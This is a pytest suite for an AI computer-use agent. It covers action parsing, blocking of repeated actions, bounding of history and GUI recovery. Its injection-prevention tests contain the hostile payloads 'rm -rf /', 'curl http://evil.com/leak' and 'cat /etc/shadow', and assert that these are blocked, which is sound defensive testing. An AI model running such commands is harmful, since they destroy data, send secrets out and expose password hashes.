"""
Tests for Agent Quality Improvements
====================================
Verifies:
1. Target extraction from goal strings (URLs, IPs, hostnames)
2. Trivial action and repeat action pre-execution blocking
3. Conversational command / pseudo-command reclassification (APP_LAUNCH, BROWSER_NAVIGATE)
4. Application name normalization to canonical binary names
5. Bounded history window (last 10 steps + summary of earlier ones)
6. Compact mode prompt selection and target injection in reasoning context
7. Stronger replan injection containing failed attempts to avoid
8. LLM-driven and target-aware goal decomposition
"""

from unittest.mock import AsyncMock, MagicMock
import time

import pytest

from sonic.computer.models import ComputerState, GitStatusInfo, ScreenObservation
from sonic.computer_use.agent import ComputerUseAgent
from sonic.computer_use.models import (
    ActionExecutionStatus,
    ComputerActionType,
    ComputerWorldObservation,
)


class DummyComputerProvider:
    """Minimal provider stub for testing agent logic without live Docker."""

    def __init__(self):
        self.gui_actions_taken = []
        self.service_actions_taken = []

    async def terminal(self, workspace_id, cmd):
        mock_res = MagicMock()
        mock_res.exit_code = 0
        mock_res.stdout = "OK"
        mock_res.stderr = ""
        return mock_res

    async def read_file(self, workspace_id, path):
        return "file contents"

    async def write_file(self, workspace_id, path, content):
        return None

    async def screenshot(self, workspace_id):
        return ScreenObservation(
            screenshot_base64="fresh-frame",
            active_window="Chromium",
            width=1920,
            height=1080,
            visible_text="Desktop",
            capture_age_ms=0,
            controls_age_ms=0,
        )

    async def gui_action(self, workspace_id, action):
        self.gui_actions_taken.append(action)
        return ScreenObservation(
            screenshot_base64="after-frame",
            active_window="Chromium",
            visible_text="",
            width=1920,
            height=1080,
            capture_age_ms=0,
            controls_age_ms=0,
        )

    async def status(self, workspace_id):
        return ComputerState(
            workspace_id=workspace_id,
            tenant_id="test",
            active_application="Chromium",
            open_applications=["Desktop", "Chromium"],
            running_processes=["sh"],
            working_directory="/home/daytona",
        )

    async def list_files(self, workspace_id, path):
        return []

    async def git_action(self, workspace_id, action, **kw):
        return GitStatusInfo(branch="main", is_clean=True)

    async def service_action(self, workspace_id, service, action):
        self.service_actions_taken.append((service, action))
        return True


class TransientScreenshotProvider(DummyComputerProvider):
    def __init__(self):
        super().__init__()
        self.screenshot_calls = 0

    async def screenshot(self, workspace_id):
        self.screenshot_calls += 1
        if self.screenshot_calls == 1:
            return ScreenObservation(
                screenshot_base64="",
                active_window="Desktop",
                width=1920,
                height=1080,
                capture_age_ms=0,
                controls_age_ms=0,
            )
        return ScreenObservation(
            screenshot_base64="valid-frame",
            active_window="Desktop",
            width=1920,
            height=1080,
        )


class StateOnlyObservationProvider(DummyComputerProvider):
    def __init__(self):
        super().__init__()
        self.screenshot_calls = 0
        self.state_calls = 0

    async def screenshot(self, workspace_id):
        self.screenshot_calls += 1
        return await super().screenshot(workspace_id)

    async def observe_state(self, workspace_id):
        self.state_calls += 1
        return ScreenObservation(
            screenshot_base64="",
            capture_timestamp_ns=1,
            capture_age_ms=15,
            controls_age_ms=10,
            perception_version=9,
            width=1920,
            height=1080,
            active_window="Document",
            visible_text="Document",
            detected_controls=[
                {
                    "name": "Save",
                    "role": "button",
                    "bbox": (30, 40, 90, 70),
                    "bbox_format": "xyxy",
                    "source": "atspi",
                    "confidence": 0.95,
                    "freshness_ms": 0,
                }
            ],
            desktop_state="STATE_ONLY",
        )


@pytest.mark.asyncio
async def test_observe_retries_transient_incomplete_desktop_frame():
    provider = TransientScreenshotProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    observation = await agent.observe("ws-1")

    assert provider.screenshot_calls == 2
    assert observation.screen.screenshot_base64 == "valid-frame"


@pytest.mark.asyncio
async def test_observe_uses_compact_state_without_fetching_screenshot():
    provider = StateOnlyObservationProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    observation = await agent.observe("ws-1")

    assert provider.state_calls == 1
    assert provider.screenshot_calls == 0
    assert observation.screen.desktop_state == "STATE_ONLY"
    assert observation.screen.screenshot_base64 == ""
    assert observation.perception_version > 0
    assert observation.perception_source == "nsi_state"
    assert observation.accessible_scene_fresh is True
    assert agent.perception_bus.resolve("Save") is not None
    assert agent._perception_counters["nsi_state_observations"] == 1


@pytest.mark.asyncio
async def test_rejected_nsi_state_cache_does_not_override_screenshot_metadata():
    provider = StateOnlyObservationProvider()
    provider.observe_state = AsyncMock(return_value=None)
    provider.screenshot = AsyncMock(return_value=ScreenObservation(
        screenshot_base64="current-frame",
        active_window="Current Screen",
        width=1920,
        height=1080,
        visible_text="Current frame content",
        capture_age_ms=0,
        controls_age_ms=0,
    ))
    provider._last_nsi_state = (
        time.monotonic(),
        {
            "version": 99,
            "capture_timestamp_ns": time.time_ns() - 5_000_000_000,
            "active_window": "Stale Window",
            "open_windows": ["Stale Window"],
        },
    )
    agent = ComputerUseAgent(computer_provider=provider)

    observation = await agent.observe("ws-1")

    assert observation.perception_source == "screenshot"
    assert observation.screen.active_window == "Current Screen"
    assert observation.visible_text == "Current frame content"
    assert observation.active_application == "Chromium"


@pytest.mark.asyncio
async def test_observe_records_action_to_next_state_latency():
    provider = StateOnlyObservationProvider()
    agent = ComputerUseAgent(computer_provider=provider)
    trace = MagicMock(id="trace-state-latency", action_to_state_ms=None)
    agent.traces.append(trace)
    agent._pending_gui_action_observation = {
        "started_ns": time.perf_counter_ns() - 1_000_000,
        "trace_id": trace.id,
    }

    observation = await agent.observe("ws-1")

    assert observation.action_to_state_ms is not None
    assert observation.action_to_state_ms >= 0
    assert trace.action_to_state_ms == observation.action_to_state_ms
    assert agent._pending_gui_action_observation is None


# ---------------------------------------------------------------------------
# 1. Target Extraction Tests
# ---------------------------------------------------------------------------

def test_extract_targets_from_goal():
    goal1 = "curl -I on falcon target https://falcon-sandbox.aivencloud.com:8443/test and check headers"
    targets1 = ComputerUseAgent._extract_targets_from_goal(goal1)
    assert targets1["urls"] == ["https://falcon-sandbox.aivencloud.com:8443/test"]

    goal2 = "check port 80 on 192.168.1.50 and host target.company.com"
    targets2 = ComputerUseAgent._extract_targets_from_goal(goal2)
    assert targets2["ips"] == ["192.168.1.50"]
    assert "target.company.com" in targets2["hostnames"]


# ---------------------------------------------------------------------------
# 2. App Name Normalization Tests
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "raw,expected",
    [
        ("the editor", "editor"),
        ("the terminal", "terminal"),
        ("a browser", "browser"),
        ("an inspector", "inspector"),
        ("  code-server  ", "code-server"),
        ("`wireshark`", "wireshark"),
        ("custom-tool", "custom-tool"),
        ("the mousepad", "mousepad"),
        ("", ""),
    ],
)
def test_normalize_app_name(raw, expected):
    assert ComputerUseAgent._normalize_app_name(raw) == expected


# ---------------------------------------------------------------------------
# 3. Action Parsing and Pseudo-Command Reclassification Tests
# ---------------------------------------------------------------------------

def test_parse_llm_action_does_not_reinterpret_terminal_launch_prose():
    text = (
        "THOUGHT: Launch code-server to inspect codebase\n"
        "ACTION: TERMINAL_EXEC\n"
        "TARGET: Launch code-server\n"
        "PAYLOAD: {\"command\": \"Launch code-server\"}\n"
        "EXPECTED: code-server starts\n"
    )
    act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert act_type == ComputerActionType.TERMINAL_EXEC
    assert target == "Launch code-server"
    assert payload.get("command") == "Launch code-server"


def test_parse_llm_action_does_not_reinterpret_terminal_navigation_prose():
    text = (
        "THOUGHT: Navigate to the target web page\n"
        "ACTION: TERMINAL_EXEC\n"
        "TARGET: navigate to https://example.com/api\n"
        "PAYLOAD: {\"command\": \"navigate to https://example.com/api\"}\n"
        "EXPECTED: Page loads\n"
    )
    act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert act_type == ComputerActionType.TERMINAL_EXEC
    assert target == "navigate to https://example.com/api"
    assert payload.get("command") == "navigate to https://example.com/api"


def test_parse_llm_action_preserves_dynamic_which_query():
    text = (
        "THOUGHT: Check which launch exists\n"
        "ACTION: TERMINAL_EXEC\n"
        "TARGET: which Launch\n"
        "PAYLOAD: {\"command\": \"which Launch\"}\n"
        "EXPECTED: path\n"
    )
    act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert act_type == ComputerActionType.TERMINAL_EXEC
    # Application resolution is dynamic; do not rewrite the model's query
    # through a hardcoded verb list or substitute a canned command.
    assert payload.get("command") == "which Launch"


def test_parse_llm_action_normalizes_which_app():
    text = (
        "THOUGHT: Check if wireshark is installed\n"
        "ACTION: TERMINAL_EXEC\n"
        "TARGET: which wireshark\n"
        "PAYLOAD: {\"command\": \"which wireshark\"}\n"
        "EXPECTED: path\n"
    )
    act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert act_type == ComputerActionType.TERMINAL_EXEC
    assert payload.get("command") == "which wireshark"


# ---------------------------------------------------------------------------
# 4. Trivial Command Pre-Execution Blocking Tests
# ---------------------------------------------------------------------------

def test_trivial_action_blocked_after_consecutive_uses():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    # 1st and 2nd trivial commands are allowed through
    agent.history.append({"action": "TERMINAL_EXEC pwd", "result": "/root"})
    agent.history.append({"action": "TERMINAL_EXEC pwd", "result": "/root"})

    # 3rd trivial command must be blocked
    rejection = agent._is_trivial_or_repeated_action(
        ComputerActionType.TERMINAL_EXEC,
        "pwd",
        {"command": "pwd"},
    )
    assert rejection is not None
    assert "BLOCKED" in rejection
    assert "trivial" in rejection


def test_exact_repeat_action_blocked():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)
    agent._recent_action_signatures = [("TERMINAL_EXEC", "ls", "ls")]

    rejection = agent._is_trivial_or_repeated_action(
        ComputerActionType.TERMINAL_EXEC,
        "ls",
        {"command": "ls"},
    )
    assert rejection is not None
    assert "BLOCKED: exact repeat" in rejection


# ---------------------------------------------------------------------------
# 5. Bounded History Window Tests
# ---------------------------------------------------------------------------

def test_format_history_bounded_to_window():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    # Add 35 history events (above the 25-step window)
    for i in range(35):
        agent.history.append({
            "action": f"ACTION_{i}",
            "result": f"result {i} (success)" if i % 2 == 0 else f"result {i} (failed)",
        })

    rendered = agent._format_history()
    lines = rendered.strip().splitlines()

    # Must contain the skipped summary line
    assert any("earlier steps" in line for line in lines)
    # The rendered steps must be at most _MAX_HISTORY_STEPS (25) + 1 summary line
    assert len(lines) <= 26
    # Last step must be step 35
    assert "35. ACTION_34" in lines[-1]


# ---------------------------------------------------------------------------
# 6. Compact Mode & Target Injection in Reasoning Context
# ---------------------------------------------------------------------------

def test_target_injected_at_top_of_observation():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider, compact_mode=True)

    obs = ComputerWorldObservation(
        terminal_output="hello",
        filesystem_files=["README.md"],
    )
    goal = "Run curl -I against https://target.internal.io:9000 and report headers"
    system_prompt, obs_summary = agent._build_reasoning_context(
        goal, obs, 1, "main.py", "test_main.py"
    )

    # Target URL must be injected at the very top of the observation
    assert "TARGET URLS: https://target.internal.io:9000" in obs_summary
    assert obs_summary.startswith("TARGET URLS:")
    # Compact mode uses compact system prompt
    assert "Universal Anti-Bypass Invariant" in system_prompt


def test_observation_caps_huge_screen_and_files():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    # 10,000 char screen text and 500 files
    huge_screen = "A" * 10000
    huge_files = [f"file_{i}.txt" for i in range(500)]
    obs = ComputerWorldObservation(
        visible_text=huge_screen,
        filesystem_files=huge_files,
    )
    _, obs_summary = agent._build_reasoning_context("test goal", obs, 1, "a.py", "b.py")

    # Screen visible content must be capped to ~4000 chars
    assert "Screen Visible Content: " + ("A" * 3997) + "..." in obs_summary
    # Files must be capped to top 60 files + more files summary
    assert "+440 more files" in obs_summary


# ---------------------------------------------------------------------------
# 7. Goal Decomposition Tests
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_decompose_goal_target_aware_heuristic():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider, llm_router=None)

    checklist = await agent.decompose_goal("curl -I on https://api.mycorp.org/health")
    descriptions = [sg.description for sg in checklist.sub_goals]

    # Target URL must be in sub-goal description rather than generic "Inspect environment"
    assert any("https://api.mycorp.org/health" in d for d in descriptions)
    assert not any("Inspect environment and orient" in d for d in descriptions)


@pytest.mark.asyncio
async def test_decompose_goal_llm_driven():
    provider = DummyComputerProvider()
    mock_router = MagicMock()
    mock_router.complete = AsyncMock()
    mock_resp = MagicMock()
    mock_resp.content = (
        "1. Send curl -I request to https://test.com\n"
        "2. Parse HTTP response status code\n"
        "3. Record verification findings\n"
    )
    mock_router.complete.return_value = mock_resp

    agent = ComputerUseAgent(computer_provider=provider, llm_router=mock_router, enable_llm_decomposition=True)
    checklist = await agent.decompose_goal("curl -I on https://test.com")

    assert len(checklist.sub_goals) == 3
    assert "Send curl -I request" in checklist.sub_goals[0].description


# ---------------------------------------------------------------------------
# 8. Stronger Replan Tests
# ---------------------------------------------------------------------------

def test_inject_replan_includes_failed_commands_to_avoid():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    agent.history.append({"action": "TERMINAL_EXEC curl", "result": "curl failed with Exit 126"})
    agent.history.append({"action": "TERMINAL_EXEC nmap", "result": "nmap blocked by policy"})

    agent._inject_replan("Test goal")

    last_entry = agent.history[-1]
    assert last_entry["action"] == "REPLAN"
    assert "FAILED ATTEMPTS TO AVOID:" in last_entry["result"]
    assert "Exit 126" in last_entry["result"]


# ---------------------------------------------------------------------------
# 9. Clean Plane Separation in Observations
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_plane_separation_in_observations():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)
    await agent.observe("ws-1")

    # 1. GUI Action does NOT write to _last_action_output
    trace_gui = await agent.execute_action(
        "ws-1",
        ComputerActionType.GUI_CLICK,
        "search button",
        {"x": 640, "y": 400},
        "click search",
    )
    assert trace_gui.status == ActionExecutionStatus.COMPLETED
    assert agent._last_action_output == {}
    assert agent._last_gui_action_result.get("action_type") == "GUI_CLICK"
    assert agent._last_gui_action_result.get("target") == "search button"

    # 2. Command action DOES write to _last_action_output
    trace_cmd = await agent.execute_action(
        "ws-1",
        ComputerActionType.TERMINAL_EXEC,
        "uname -a",
        {"command": "uname -a"},
        "system info",
    )
    assert trace_cmd.status == ActionExecutionStatus.COMPLETED
    assert agent._last_action_output.get("command") == "uname -a"
    assert "OK" in agent._last_action_output.get("stdout", "")

    # 3. Defensive check: observe() does not pollute terminal_output if GUI click was somehow set
    agent._last_action_output = {
        "command": "{'x': 640, 'y': 400}",
        "stdout": "Clicked at (640, 400)",
        "stderr": "",
        "exit_code": 0,
    }
    obs = await agent.observe("ws-1")
    assert "$ {'x': 640, 'y': 400}" not in obs.terminal_output
    assert "Clicked at (640, 400)" not in obs.terminal_output


# ---------------------------------------------------------------------------
# 10. Prevent Shell Command Injection in UI
# ---------------------------------------------------------------------------

def test_prevent_shell_command_injection_in_ui_parse():
    # 1. BROWSER_TYPE: command field in payload is NOT mapped to text
    text_browser = (
        "THOUGHT: Type command into input field\n"
        "ACTION: BROWSER_TYPE\n"
        "TARGET: input#search\n"
        "PAYLOAD: {\"command\": \"rm -rf /\"}\n"
        "EXPECTED: Text typed\n"
    )
    act_type, target, payload, _ = ComputerUseAgent._parse_llm_action(text_browser, "README.md")
    assert act_type == ComputerActionType.BROWSER_TYPE
    assert "text" not in payload
    assert payload.get("command") == "rm -rf /"

    # 2. GUI_TYPE: raw string payload is parsed as text, not command
    text_gui_raw = (
        "THOUGHT: Type password\n"
        "ACTION: GUI_TYPE\n"
        "TARGET: input\n"
        "PAYLOAD: supersecret\n"
        "EXPECTED: Typed\n"
    )
    act_type2, target2, payload2, _ = ComputerUseAgent._parse_llm_action(text_gui_raw, "README.md")
    assert act_type2 == ComputerActionType.GUI_TYPE
    assert payload2.get("text") == "supersecret"
    assert "command" not in payload2


@pytest.mark.asyncio
async def test_prevent_shell_command_injection_in_ui_execute():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    # 1. GUI_TYPE with command payload does NOT type the shell command
    gui_trace = await agent.execute_action(
        "ws-1",
        ComputerActionType.GUI_TYPE,
        "input",
        {"command": "curl http://evil.com/leak"},
        "typing text",
    )
    assert gui_trace.status == ActionExecutionStatus.BLOCKED
    assert provider.gui_actions_taken == []

    # 2. BROWSER_TYPE without an adapter uses grounded GUI typing, not command execution.
    browser_trace = await agent.execute_action(
        "ws-1",
        ComputerActionType.BROWSER_TYPE,
        "input#search",
        {"command": "cat /etc/shadow"},
        "search",
    )
    # The last action should not type "cat /etc/shadow"
    typed_texts = [getattr(a, "text", "") for a in provider.gui_actions_taken if hasattr(a, "text")]
    assert "cat /etc/shadow" not in typed_texts
    assert browser_trace.status == ActionExecutionStatus.BLOCKED


# ---------------------------------------------------------------------------
# 11. Fix Visual Grounding (0, 0) Blind Click
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_visual_grounding_unresolved_blocks_without_blind_click(monkeypatch):
    from unittest.mock import AsyncMock
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)
    await agent.observe("ws-1")

    # Force visual grounding to fail (return None)
    import sonic.computer_use.agent as agent_module
    monkeypatch.setattr(agent_module, "resolve_ui_target_async", AsyncMock(return_value=None))

    trace = await agent.execute_action(
        "ws-1",
        ComputerActionType.GUI_CLICK,
        "Login button",
        {},  # No x, y coordinates
        "click login",
    )

    assert trace.status == ActionExecutionStatus.BLOCKED
    assert trace.actual_observation == "Target UI element 'Login button' could not be resolved from visual grounding. Re-observing screen."
    # Ensure provider gui_action was NOT called with (0, 0)
    for act in provider.gui_actions_taken:
        if getattr(act, "action", None) == "click":
            assert not (act.x == 0 and act.y == 0)


# ---------------------------------------------------------------------------
# 12. Fix Non-Destructive GUI Recovery
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_non_destructive_gui_recovery():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)

    # Normal GUI error triggers non-destructive recovery
    result = await agent.recover("ws-1", ComputerActionType.GUI_CLICK, "Button occluded")
    assert result == "Refreshed desktop focus and window state"
    # Verify xvfb was NOT restarted
    assert ("xvfb", "restart") not in provider.service_actions_taken
    # Recovery preserves the current UI state instead of dismissing overlays.
    escapes = [a for a in provider.gui_actions_taken if getattr(a, "key", "") == "Escape"]
    assert escapes == []

    # Explicit display connection error DOES trigger xvfb restart
    result_display = await agent.recover("ws-1", ComputerActionType.GUI_CLICK, "Error: cannot open display :0")
    assert result_display == "Restarted Xvfb and refreshed display session"
    assert ("xvfb", "restart") in provider.service_actions_taken


# ---------------------------------------------------------------------------
# 13. Capture the shared desktop without invoking a hidden application
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_gui_screenshot_uses_the_shared_desktop():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)
    trace = await agent.execute_action(
        "ws-1",
        ComputerActionType.GUI_SCREENSHOT,
        "screenshot",
        {},
        "capture view",
    )

    assert trace.status == ActionExecutionStatus.COMPLETED
    assert "Screenshot captured" in trace.actual_observation


# ---------------------------------------------------------------------------
# 14. Resilient Action Parsing & Model Autonomy Tests
# ---------------------------------------------------------------------------

def test_parse_llm_action_extracts_from_answer_prefix():
    text = (
        "THOUGHT: I should inspect disk space\n"
        "**Answer:** TERMINAL_EXEC, TARGET: df, PAYLOAD: {\"command\": \"df -h\"}\n"
        "EXPECTED: Disk usage\n"
    )
    act_type, target, payload, expected = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert act_type == ComputerActionType.TERMINAL_EXEC
    assert payload.get("command") == "df -h"


def test_parse_llm_action_detects_freeform_goal_completion():
    text = (
        "The system hostname is: `8e8d478afea9`\n\n"
        "The disk space information is as follows:\n"
        "- The root filesystem (`/`) is using 4% of its available space.\n"
        "All requested information has been successfully gathered."
    )
    from sonic.computer_use.agent import _GOAL_COMPLETE_SENTINEL
    act_type, target, payload, expected = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert expected == _GOAL_COMPLETE_SENTINEL
    assert target == "goal-complete"


def test_parse_llm_action_rejects_markdown_code_block():
    text = (
        "To check system hostname and disk space, execute:\n"
        "```bash\n"
        "hostname && df -h\n"
        "```\n"
    )
    act_type, target, payload, expected = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert act_type == ComputerActionType.TERMINAL_EXEC
    assert payload.get("command") != "hostname && df -h"
    assert payload.get("command") == ""


def test_parse_llm_action_robust_json_with_trailing_commentary():
    text = (
        "ACTION: TERMINAL_EXEC\n"
        "TARGET: hostname\n"
        "PAYLOAD: {\"command\": \"hostname\"}\n\nThis will execute the hostname command.\n"
        "EXPECTED: Hostname displayed\n"
    )
    act_type, target, payload, expected = ComputerUseAgent._parse_llm_action(text, "README.md")
    assert act_type == ComputerActionType.TERMINAL_EXEC
    assert payload.get("command") == "hostname"


@pytest.mark.asyncio
async def test_terminal_action_repeat_blocked_and_tracked():
    provider = DummyComputerProvider()
    agent = ComputerUseAgent(computer_provider=provider)
    
    # Execute first terminal action
    await agent.execute_action(
        "ws-1",
        ComputerActionType.TERMINAL_EXEC,
        "hostname",
        {"command": "hostname"},
        "get hostname",
    )
    assert len(agent._recent_action_signatures) == 1
    assert agent._recent_action_signatures[0] == ("TERMINAL_EXEC", "hostname", "{'command': 'hostname'}")

    # Second identical action must be blocked
    rejection = agent._is_trivial_or_repeated_action(
        ComputerActionType.TERMINAL_EXEC,
        "hostname",
        {"command": "hostname"},
    )
    assert rejection is not None
    assert "BLOCKED: exact repeat" in rejection


@pytest.mark.asyncio
async def test_tool_author_direct_script_writing_completes():
    """TOOL_AUTHOR on a specific script path writes file to workspace and returns COMPLETED."""
    from unittest.mock import AsyncMock
    from sonic.computer_use.models import ComputerActionType, ActionExecutionStatus

    provider = AsyncMock()
    provider.write_file = AsyncMock()
    agent = ComputerUseAgent(computer_provider=provider)

    trace = await agent.execute_action(
        workspace_id="ws-test",
        action_type=ComputerActionType.TOOL_AUTHOR,
        target_resource="/home/sonic/workspace/sonic_dual_plane_audit/sys_probe.py",
        payload={
            "path": "/home/sonic/workspace/sonic_dual_plane_audit/sys_probe.py",
            "source": "import os\nprint('sys probe ok')\n",
        },
        predicted_outcome="sys probe script written",
    )

    provider.write_file.assert_awaited_once_with(
        "ws-test",
        "/home/sonic/workspace/sonic_dual_plane_audit/sys_probe.py",
        "import os\nprint('sys probe ok')\n",
    )
    assert trace.status == ActionExecutionStatus.COMPLETED
    assert "Authored script at" in trace.actual_observation
